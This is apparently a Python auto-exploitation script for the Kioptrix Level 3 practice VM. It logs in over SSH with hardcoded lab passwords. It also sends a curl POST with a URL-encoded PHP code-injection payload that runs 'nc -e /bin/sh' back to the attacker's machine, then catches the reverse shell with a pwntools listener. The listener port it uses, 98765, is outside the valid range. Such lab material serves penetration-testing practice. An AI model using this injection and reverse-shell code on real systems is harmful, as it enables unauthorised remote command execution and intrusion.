#!/usr/bin/python3
import threading, requests, time
from os import *

def leave():
	print("[\033[31m!\033[39m] Usage: ./kioptrix3.py <local ip> <target ip>")
	print("[\033[31m!\033[39m] Example: ./kioptrix3.py 192.168.1.8 192.168.1.18")
	print("[\033[31m!\033[39m] Quitting")
	time.sleep(3)
	exit(1)

def quit():
	os.system('clear')
	print('Thanks for using my AutoPwn')
	print('Quitting...')
	time.sleep(3)
	os.system('clear')
	exit(1)

def menu():
	print("Select the user you want to log in with: ")
	print("\t1) loneferret          2) www-data")
	print("\t3) Exit\n")
	attackT = input("Choose your option: ")
	return attackT

def loneferretCon(target):
	request = ssh(host=target, user='loneferret', password='starwars')
	shell = request.run("/bin/sh")
	shell.sendline(b"clear; echo -n 'Logged in as: '; whoami")
	shell.interactive()

def dregCon(target):
	request = ssh(host=target, user='dreg', password='Mast3r')
	shell = request.run("/bin/bash")
	shell.interactive()

def cmd():
	targetip = sys.argv[2]
	ip = sys.argv[1]
	targeturl = "http://"+targetip+"/index.php"
	os.system('curl -s -X POST '+targeturl+' -d "page=index%27)%3B%24{system(%27nc%20-e%20%2fbin%2fsh%20"'+ip+'"%2098765%27)}%3B%23%22"')

def wdataCon():
	threading.Thread(target=cmd).start()
	shell = listen(98765, timeout=20).wait_for_connection()
	shell.sendline(b"script /dev/null -c bash")
	shell.sendline(b"export TERM=xterm; export SHELL=bash")
	shell.sendline(b"clear; echo -n 'Logged in as: '; whoami")
	shell.interactive()

try: from pwn import *
except:
	print("You have to run it as root.")
	leave()

try:
	sys.argv[1]
	try: sys.argv[2]
	except: leave()
except: leave()

ip = sys.argv[1]
target = sys.argv[2]

option = menu()

if int(option) == 1:
	loneferretCon(target)
#elif int(option) == 2:
#	dregCon(target)
elif int(option) == 2:
	wdataCon()
else:
	quit()
